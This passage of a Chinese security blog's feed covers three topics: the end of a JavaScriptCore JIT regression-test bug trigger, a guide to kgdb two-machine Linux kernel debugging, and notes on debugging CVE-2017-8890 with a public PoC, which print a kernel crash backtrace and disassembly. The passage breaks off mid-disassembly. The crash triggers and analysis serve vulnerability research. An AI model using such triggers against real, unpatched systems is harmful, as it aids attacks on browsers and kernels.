class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Regression test for bug 179212</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = &#123; <span class="string">"a"</span>: &#123;&#125; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> data = [];</span><br><span class="line"><span class="keyword">var</span> copy = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> z = <span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">    getPrototypeOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">2</span>) &#123;</span><br><span class="line">            data[<span class="number">0</span>] = &#123; <span class="string">"x"</span>: <span class="string">"I changed"</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>) &#123;</span><br><span class="line">            flag = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"a"</span>: <span class="number">1</span>, <span class="string">"b"</span>: <span class="number">2</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.__proto__ = z;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">    data = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    copy = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runTest</span>(<span class="params">func</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reset();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">        func();</span><br><span class="line"></span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy[<span class="number">0</span>].x != <span class="string">"I changed"</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">"Expected updated value for copy[0]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testWithFTL</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        data[<span class="number">0</span>] = <span class="number">2.2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> d <span class="keyword">in</span> p) &#123;</span><br><span class="line">            copy[<span class="number">0</span>] = data[<span class="number">0</span>];</span><br><span class="line">            copy[<span class="number">1</span>] = data[<span class="number">1</span>];</span><br><span class="line">            copy[<span class="number">2</span>] = data[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    runTest(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testWithFTL();</span><br></pre></td></tr></table></figure></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/" target="_blank" rel="noopener">https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;调试crash的准备工作&quot;&gt;&lt;a href=&quot;#调试crash的准备工作&quot; class=&quot;headerlink&quot; title=&quot;调试crash的准备工作&quot;&gt;&lt;/a&gt;调试crash的准备工作&lt;/h2&gt;&lt;h3 id=&quot;下载-Webkit-源代码并编译&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="webkit" scheme="http://eternalsakura13.com/tags/webkit/"/>
    
  </entry>
  
  <entry>
    <title>内核双机调试环境搭建</title>
    <link href="http://eternalsakura13.com/2018/04/15/kernel_debug/"/>
    <id>http://eternalsakura13.com/2018/04/15/kernel_debug/</id>
    <published>2018-04-15T14:53:24.387Z</published>
    <updated>2018-04-15T14:53:24.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="选择kernel的版本"><a href="#选择kernel的版本" class="headerlink" title="选择kernel的版本"></a>选择kernel的版本</h2><p>搜索含有dbgsym的内核版本<br><code>apt-cache search linux-image | grep dbgsym | grep 4.11</code><br>搜索特定source code的内核版本<br><code>apt-cache search linux-source</code><br>然后选择一个</p><h2 id="安装内核"><a href="#安装内核" class="headerlink" title="安装内核"></a>安装内核</h2><p>搜索要下载的linux内核版本<br><code>apt-cache search linux-image | grep linux-image | grep generic</code><br>安装内核<br><code>sudo apt-get install linux-image-4.10.0-19-generic</code><br>查看安装的内核版本<br><code>sudo dpkg --list | grep linux-image</code><br>重启，在grub之前，按住shift，选择我们的内核<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-162043.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-162050.png" alt=""></p><p>验证新内核启用<br><code>uname -sr</code></p><h2 id="安装符号文件"><a href="#安装符号文件" class="headerlink" title="安装符号文件"></a>安装符号文件</h2><p>在终端输入下面的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">codename=$(lsb_release -c | awk  &apos;&#123;print $2&#125;&apos;)</span><br><span class="line">sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOF</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;      main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates  main restricted universe multiverse</span><br><span class="line">deb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverse</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></p><p>添加访问符号服务器的密钥文件：<br><code>wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -</code><br>执行<code>sudo apt-get update</code>更新<br>执行如下命令开始下载符号包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-image-`uname -r`-dbgsym</span><br></pre></td></tr></table></figure></p><h2 id="安装kernel对应的源代码"><a href="#安装kernel对应的源代码" class="headerlink" title="安装kernel对应的源代码"></a>安装kernel对应的源代码</h2><p>打开/etc/apt/sources.list，启用deb-src，sudo apt-get update更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line">去掉下面这句话的注释</span><br><span class="line">deb-src http://us.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></p><ul><li>搜索所有版本的source code:<code>apt-cache search linux-source</code></li><li>安装指定版本的source code:<code>sudo apt-get install linux-source-4.10.0</code></li></ul><p>下载好的源码会被放在/usr/src目录下。<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180414/18LAA2CL2i.png?imageslim" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/180414/EjhiGd0J3c.png?imageslim" alt="mark"></p><p>解压缩得到源码<br><code>sudo tar -xvf linux-source-4.10.0.tar.bz2</code></p><p>一切都安装好了之后，就可以拷贝一份我们的虚拟机，一个作为host,一个作为target</p><h2 id="移除打印机，添加串口"><a href="#移除打印机，添加串口" class="headerlink" title="移除打印机，添加串口"></a>移除打印机，添加串口</h2><p>打印机会占用我们的串口</p><h3 id="target"><a href="#target" class="headerlink" title="target"></a>target</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-162815.png" alt=""></p><h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-BF66B78DD197DE00441A9AEB9EAC8BC4.jpg" alt=""></p><h2 id="配置target"><a href="#配置target" class="headerlink" title="配置target"></a>配置target</h2><p>需要让target在开机时候进入kgdb的调试状态，首先需要修改grub文件，增加grub引导时候的菜单项。</p><p><code>sudo vim /etc/grub.d/40_custom</code><br>修改的内容从/boot/grub/grub.cfg里复制，复制一个菜单项（menuentry）过来，再把菜单名中增加调试信息，然后在内核命令行中增加KGDB选项，即下面这样：<br><strong>新增部分：kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">exec tail -n +3 $0</span><br><span class="line"># This file provides an easy way to add custom menu entries.  Simply type the</span><br><span class="line"># menu entries you want to add after this comment.  Be careful not to change</span><br><span class="line"># the &apos;exec tail&apos; line above.</span><br><span class="line">menuentry &apos;Ubuntu,KGDB with nokaslr&apos; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &apos;gnulinux-4.10.0-19-generic-advanced-32ee8e9c-31e6-494c-a9ea-1a416cbfeca7&apos; &#123;</span><br><span class="line">                recordfail</span><br><span class="line">                load_video</span><br><span class="line">                gfxmode $linux_gfx_mode</span><br><span class="line">                insmod gzio</span><br><span class="line">                if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi</span><br><span class="line">                insmod part_msdos</span><br><span class="line">                insmod ext2</span><br><span class="line">                set root=&apos;hd0,msdos1&apos;</span><br><span class="line">                if [ x$feature_platform_search_hint = xy ]; then</span><br><span class="line">                  search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1  32ee8e9c-31e6-494c-a9ea-1a416cbfeca7</span><br><span class="line">                else</span><br><span class="line">                  search --no-floppy --fs-uuid --set=root 32ee8e9c-31e6-494c-a9ea-1a416cbfeca7</span><br><span class="line">                fi</span><br><span class="line">                echo    &apos;Ubuntu,KGDB with nokaslr ...&apos;</span><br><span class="line">                linux   /boot/vmlinuz-4.10.0-19-generic root=UUID=32ee8e9c-31e6-494c-a9ea-1a416cbfeca7 ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr</span><br><span class="line">                echo    &apos;Loading initial ramdisk ...&apos;</span><br><span class="line">                initrd  /boot/initrd.img-4.10.0-19-generic</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>修改grub的配置后，需要执行sudo update-grub来更新。更新后目标机器就准备好了。<br>重启按住shift,进入刚才添加的menu即可进入到被调试状态。</p><h2 id="配置host"><a href="#配置host" class="headerlink" title="配置host"></a>配置host</h2><p>设置串口通信的波特率<br><code>sudo stty -F /dev/ttyS0 115200</code><br>要查看是否设置成功<br><code>sudo stty -F /dev/ttyS0</code><br>注意这个每次host重启都要再输入一遍，嗯，写个shell吧。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>编写config，用source加载（直接在gdb里输入也可）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">target remote /dev/ttyS0</span><br></pre></td></tr></table></figure></p><p>使用gdb来调试带符号的vmlinux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb -s /usr/lib/debug/boot/vmlinux-4.10.0-19-generic</span><br><span class="line">gdb &gt; source config</span><br></pre></td></tr></table></figure><p>符号加载完成，bt查看当前栈帧，c运行内核。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-162731.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-162722.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-162712.png" alt=""></p><h2 id="查看源码遇到的问题"><a href="#查看源码遇到的问题" class="headerlink" title="查看源码遇到的问题"></a>查看源码遇到的问题</h2><p><img src="http://onc55v8te.bkt.clouddn.com/blog/180414/B2ildJ3Bid.png?imageslim" alt="mark"></p><p>可以看到，list本来应该显示具体的源码，但是这里只是打印出了它所在的文件，这是因为在这个路径下没有源码。<br>所以说我们就建立这个路径，然后把源码放进去</p><p><img src="http://onc55v8te.bkt.clouddn.com/blog/180414/3DGa0AdAEh.png?imageslim" alt="mark"><br>然后dir设置好目录<br><code>dir /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0</code><br>现在就可以查看源码了。<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180414/J3IJ1i0jE3.png?imageslim" alt="mark"></p><h2 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h2><p>我从头开始说：</p><ul><li>host<br>target remote /dev/ttyS0<br>按c继续运行target</li><li>target<br>一开始停在下图这个地方，host按c之后，target继续运行进入系统<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-12-162722.png" alt=""><br>然后输入<code>sudo su &amp;&amp; echo g &gt; &quot;/proc/sysrq-trigger&quot;</code><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-15-060050.png" alt=""><br>这时候target应该进入假死状态，其实就是完全动不了。<br>这一步就是打开target的kgdb调试。</li><li>host<br>这时候host那里不再是<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-15-060210.png" alt=""><br>而是停下来了，可以下断了<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-15-060229.jpg" alt=""><br>在你想要调试的函数下断点，然后按c，恢复target执行。</li><li>target<br>这样就可以运行我们的poc了<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-15-060338.jpg" alt=""></li><li>host<br>回到host，此时应该已经停在断点了，然后按n可以单步调试。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-15-060453.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-15-060502.jpg" alt=""></li></ul><p>至此，内核调试的整个配置和调试方法都写完了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://advdbg.org/blogs/advdbg_system/search.aspx?q=%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95&amp;p=1" target="_blank" rel="noopener">ubuntu内核调试要点</a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>内核调试的坑实在太深，一开始参考了muhe师傅的文章用gdb+qemu调，然后编译了kernel 4.x之后，编译不报错，但是调试过程简直了，gdb花式挂不上去，看网上说某些版本要改gdb源码重新编译gdb……放弃了放弃了。<br>感谢教我搭建双机调试的师傅……<br>内核还是很容易调飞的，有时候花式加载不出来。</p><p>另外如果下载符号文件太慢，可以参考我的这篇文章，在虚拟机里用ss代理。<br><a href="http://eternalsakura13.com/2018/02/02/proxy/">http://eternalsakura13.com/2018/02/02/proxy/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;选择kernel的版本&quot;&gt;&lt;a href=&quot;#选择kernel的版本&quot; class=&quot;headerlink&quot; title=&quot;选择kernel的版本&quot;&gt;&lt;/a&gt;选择kernel的版本&lt;/h2&gt;&lt;p&gt;搜索含有dbgsym的内核版本&lt;br&gt;&lt;code&gt;apt-cache
      
    
    </summary>
    
      <category term="kernel" scheme="http://eternalsakura13.com/categories/kernel/"/>
    
    
      <category term="kernel" scheme="http://eternalsakura13.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-8890调试笔记</title>
    <link href="http://eternalsakura13.com/2018/04/14/cve-2017-8890/"/>
    <id>http://eternalsakura13.com/2018/04/14/cve-2017-8890/</id>
    <published>2018-04-13T17:30:45.084Z</published>
    <updated>2018-04-19T03:52:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="poc运行"><a href="#poc运行" class="headerlink" title="poc运行"></a>poc运行</h2><p>在github找了一个<a href="https://github.com/beraphin/CVE-2017-8890/blob/master/poc.cpp" target="_blank" rel="noopener">poc</a><br>在target里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/beraphin/CVE-2017-8890.git</span><br><span class="line">g++ -pthread -o poc poc.cpp</span><br></pre></td></tr></table></figure></p><p>target里<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180414/CcbA2dDhba.png?imageslim" alt="mark"><br>然后回到host发现已经断下了（panic)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">[   41.176158] sd 2:0:0:0: [sda] Assuming drive cache: write through</span><br><span class="line">[  121.392169] BUG: unable to handle kernel NULL pointer dereference at 0000000000000006</span><br><span class="line">[  121.417112] IP: ip_mc_leave_src+0x25/0x90</span><br><span class="line">[  121.433182] PGD 1e957067 </span><br><span class="line">[  121.433184] PUD 1bc25067 </span><br><span class="line">[  121.446277] PMD 0 </span><br><span class="line">[  121.462184] </span><br><span class="line">[  121.490174] Oops: 0000 [#1] SMP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────[ code:i386:x86-64:intel ]────</span><br><span class="line">   0xffffffff8182f49d &lt;ip_mc_leave_src+29&gt; test   rbx, rbx</span><br><span class="line">   0xffffffff8182f4a0 &lt;ip_mc_leave_src+32&gt; je     0xffffffff8182f4ef &lt;ip_mc_leave_src+111&gt;</span><br><span class="line">   0xffffffff8182f4a2 &lt;ip_mc_leave_src+34&gt; mov    edx, DWORD PTR [rsi+0x14]</span><br><span class="line">   0xffffffff8182f4a5 &lt;ip_mc_leave_src+37&gt; mov    ecx, DWORD PTR [rbx+0x4]</span><br><span class="line">   0xffffffff8182f4a8 &lt;ip_mc_leave_src+40&gt; lea    rsi, [rsi+0x8]</span><br><span class="line">   0xffffffff8182f4ac &lt;ip_mc_leave_src+44&gt; lea    r8, [rbx+0x18]</span><br><span class="line">   0xffffffff8182f4b0 &lt;ip_mc_leave_src+48&gt; xor    r9d, r9d</span><br><span class="line">   0xffffffff8182f4b3 &lt;ip_mc_leave_src+51&gt; call   0xffffffff8182f110 &lt;ip_mc_del_src&gt;</span><br><span class="line">   0xffffffff8182f4b8 &lt;ip_mc_leave_src+56&gt; mov    QWORD PTR [r12+0x18], 0x0</span><br><span class="line">[!] Command &apos;context&apos; failed to execute properly, reason: Sign not allowed in string format specifier</span><br><span class="line">gef➤  bt</span><br><span class="line">#0  0xffffffff8182f4a5 in ip_mc_leave_src (sk=0xffff88003a10f800, iml=0xffff88003a6cac40, in_dev=0x0 &lt;irq_stack_union&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2155</span><br><span class="line">#1  0xffffffff81832f18 in ip_mc_drop_socket (sk=0xffff88003a10f800) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2607</span><br><span class="line">#2  0xffffffff8182c2c0 in inet_release (sock=0xffff8800383c3200) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/af_inet.c:411</span><br><span class="line">#3  0xffffffff8178b7bf in sock_release (sock=0x0 &lt;irq_stack_union&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/socket.c:599</span><br><span class="line">#4  0xffffffff8178b832 in sock_close (inode=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/socket.c:1063</span><br><span class="line">#5  0xffffffff81246937 in __fput (file=0xffff8800341ea200) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/fs/file_table.c:209</span><br><span class="line">#6  0xffffffff81246ade in ____fput (work=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/fs/file_table.c:245</span><br><span class="line">#7  0xffffffff810a706e in task_work_run () at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/kernel/task_work.c:116</span><br><span class="line">#8  0xffffffff810032ba in tracehook_notify_resume (regs=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/include/linux/tracehook.h:191</span><br><span class="line">#9  exit_to_usermode_loop (regs=0xffffc90003a0bf58, cached_flags=0x2) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:160</span><br><span class="line">#10 0xffffffff81003b29 in prepare_exit_to_usermode (regs=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:190</span><br><span class="line">#11 syscall_return_slowpath (regs=0xffffc90003a0bf58) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:259</span><br><span class="line">#12 0xffffffff818ce948 in entry_SYSCALL_64 () at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/entry_64.S:239</span><br><span class="line">#13 0x0000000000000000 in ?? ()</span><br><span class="line">gef➤  l</span><br><span class="line">2150if (!psf) &#123;</span><br><span class="line">2151/* any-source empty exclude case */</span><br><span class="line">2152return ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2153iml-&gt;sfmode, 0, NULL, 0);</span><br><span class="line">2154&#125;</span><br><span class="line">2155err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2156iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, 0);</span><br><span class="line">2157RCU_INIT_POINTER(iml-&gt;sflist, NULL);</span><br><span class="line">2158/* decrease mem now to avoid the memleak warning */</span><br><span class="line">2159atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">gef➤  info registers </span><br><span class="line">rax            0x00x0</span><br><span class="line">rbx            0x20x2</span><br><span class="line">...</span><br><span class="line">gef➤  x /50i ip_mc_leave_src</span><br><span class="line">   0xffffffff8182f480 &lt;ip_mc_leave_src&gt;:nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0xffffffff8182f485 &lt;ip_mc_leave_src+5&gt;:push   rbp</span><br><span class="line">   0xffffffff8182f486 &lt;ip_mc_leave_src+6&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff8182f489 &lt;ip_mc_leave_src+9&gt;:push   r14</span><br><span class="line">   0xffffffff8182f48b &lt;ip_mc_leave_src+11&gt;:push   r13</span><br><span class="line">   0xffffffff8182f48d &lt;ip_mc_leave_src+13&gt;:push   r12</span><br><span class="line">   0xffffffff8182f48f &lt;ip_mc_leave_src+15&gt;:push   rbx</span><br><span class="line">   0xffffffff8182f490 &lt;ip_mc_leave_src+16&gt;:mov    r14,rdi</span><br><span class="line">   0xffffffff8182f493 &lt;ip_mc_leave_src+19&gt;:mov    rbx,QWORD PTR [rsi+0x18]</span><br><span class="line">   0xffffffff8182f497 &lt;ip_mc_leave_src+23&gt;:mov    r12,rsi</span><br><span class="line">   0xffffffff8182f49a &lt;ip_mc_leave_src+26&gt;:mov    rdi,rdx</span><br><span class="line">   0xffffffff8182f49d &lt;ip_mc_leave_src+29&gt;:test   rbx,rbx</span><br><span class="line">   0xffffffff8182f4a0 &lt;ip_mc_leave_src+32&gt;:je     0xffffffff8182f4ef &lt;ip_mc_leave_src+111&gt;</span><br><span class="line">   0xffffffff8182f4a2 &lt;ip_mc_leave_src+34&gt;:mov    edx,DWORD PTR [rsi+0x14]</span><br><span class="line">=&gt; 0xffffffff8182f4a5 &lt;ip_mc_leave_src+37&gt;:mov    ecx,DWORD PTR [rbx+0x4]---&gt;crash</span><br><span class="line">   0xffffffff8182f4a8 &lt;ip_mc_leave_src+40&gt;:lea    rsi,[rsi+0x8]</span><br><span class="line">   0xffffffff8182f4ac &lt;ip_mc_leave_src+44&gt;:lea    r8,[rbx+0x18]</span><br><span class="line">   0xffffffff8182f4b0 &lt;ip_mc_leave_src+48&gt;:xor    r9d,r9d</span><br><span class="line">   0xffffffff8182f4b3 &lt;ip_mc_leave_src+51&gt;:call   0xffffffff8182f110 &lt;ip_mc_del_src&gt;</span><br><span class="line">   0xffffffff8182f4b8 &lt;ip_mc_leave_src+56&gt;:mov    QWORD PTR [r12+0x18],0x0</span><br><span class="line">   0xffffffff8182f4c1 &lt;ip_mc_leave_src+65&gt;:mov    r13d,eax</span><br><span class="line">   0xffffffff8182f4c4 &lt;ip_mc_leave_src+68&gt;:mov    eax,DWORD PTR [rbx]</span><br><span class="line">   0xffffffff8182f4c6 &lt;ip_mc_leave_src+70&gt;:lea    eax,[rax*4+0x18]</span><br><span class="line">   0xffffffff8182f4cd &lt;ip_mc_leave_src+77&gt;:sub    DWORD PTR 